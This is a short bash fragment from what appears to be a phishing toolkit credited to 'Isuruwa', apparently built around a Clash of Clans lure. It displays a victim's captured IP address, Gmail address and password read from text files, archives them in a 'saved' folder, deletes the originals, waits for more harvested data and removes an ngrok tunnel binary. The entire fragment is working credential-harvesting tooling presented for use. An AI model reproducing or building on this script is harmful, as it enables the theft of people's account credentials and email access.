echo -e "$red------------$cyan[ Tool By {Isuruwa} ]$red------------$rset"
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat ip.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] IP:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat gmail.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] GMAIL:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat pass.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] PASS:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
cp -f ip.txt gmail.txt pass.txt $HOME/AIOP/source/saved/coc
rm -rf ip.txt gmail.txt pass.txt
echo ""
echo ""
printf "         \e[1;92m\e[1;77m\e[0m\e[1;96m |\e[96m WAITING FOR DATA ,\e[0m\e[1;91m PRESS CTRL+C TO STOP \e[96m|\e[0m\n"
echo $'\cc' | rm -rf ngrok